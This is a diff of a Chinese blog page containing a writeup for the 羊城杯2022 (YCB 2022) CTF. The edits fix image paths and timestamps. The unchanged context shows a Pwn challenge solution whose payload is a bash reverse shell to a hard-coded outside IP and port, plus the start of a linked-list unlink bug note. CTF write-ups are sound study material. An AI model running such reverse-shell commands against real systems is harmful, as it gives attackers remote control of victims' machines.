@@ -27,8 +27,11 @@
 <meta property="og:site_name" content="TWe1v3">
 <meta property="og:description" content="羊城杯2022–Writeup ​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3  这个比赛太累了可，凌晨三点碰着枕头就睡着了">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://twe1v3.github.io/images/1280X1280.png">
+<meta property="og:image" content="http://twe1v3.github.io/images/1.PNG">
+<meta property="og:image" content="http://twe1v3.github.io/images/2.PNG">
 <meta property="article:published_time" content="2022-09-05T18:13:31.000Z">
-<meta property="article:modified_time" content="2022-09-06T17:24:48.179Z">
+<meta property="article:modified_time" content="2022-09-06T17:36:54.279Z">
 <meta property="article:author" content="TWe1v3">
 <meta property="article:tag" content="Crypto">
 <meta property="article:tag" content="Web">
@@ -37,6 +40,7 @@
 <meta property="article:tag" content="Reverse">
 <meta property="article:tag" content="Writeup">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://twe1v3.github.io/images/1280X1280.png">
 
 
 <link rel="canonical" href="http://twe1v3.github.io/2022/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/">
@@ -249,7 +253,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-09-07 01:24:48" itemprop="dateModified" datetime="2022-09-07T01:24:48+08:00">2022-09-07</time>
+      <time title="修改时间：2022-09-07 01:36:54" itemprop="dateModified" datetime="2022-09-07T01:36:54+08:00">2022-09-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -290,14 +294,15 @@
 <p>​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3</p>
 <hr>
 <p>这个比赛太累了可，凌晨三点碰着枕头就睡着了，不过收获也蛮多的，这次题目很友好，不像wmCTF一样坐大牢。感谢两位大哥的实力带飞，太菜了我。全靠躺。</p>
-<span id="more"></span>                      ![1280X1280](D:\TWe1v3's blog\Hexo\blog\source\_posts\羊城杯2022-Writeup\1280X1280.PNG)
+<span id="more"></span>          
+<p>​            <img src="/images/1280X1280.png" alt="1280X1280"></p>
 <h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
 <h3 id="ycbsql"><a class="markdownIt-Anchor" href="#ycbsql"></a> YCBSQL</h3>
 <p>这个应该是有了非预期，可以直接调用shell，我们直接反弹就行。</p>
-<p>![1280X1280 (1)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (1).PNG)</p>
+<p><img src="/images/1.PNG" alt="1"></p>
 <p>Payload:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.system bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/101.43.255.238/7777 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-<p>![1280X1280 (2)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (2).PNG)</p>
+<p><img src="/images/2.PNG" alt="2"></p>
 <h3 id="ez_linklist-v2"><a class="markdownIt-Anchor" href="#ez_linklist-v2"></a> ez_linklist-v2</h3>
 <p>这个题目的漏洞就是在unlink的时候如果是unlink的头指针，那么后面的指针没有清空，就会是这样：</p>
 <p>![1280X1280 (3)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (3).PNG)</p>
@@ -494,7 +499,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">79k</span>
+    <span title="站点总字数">78k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
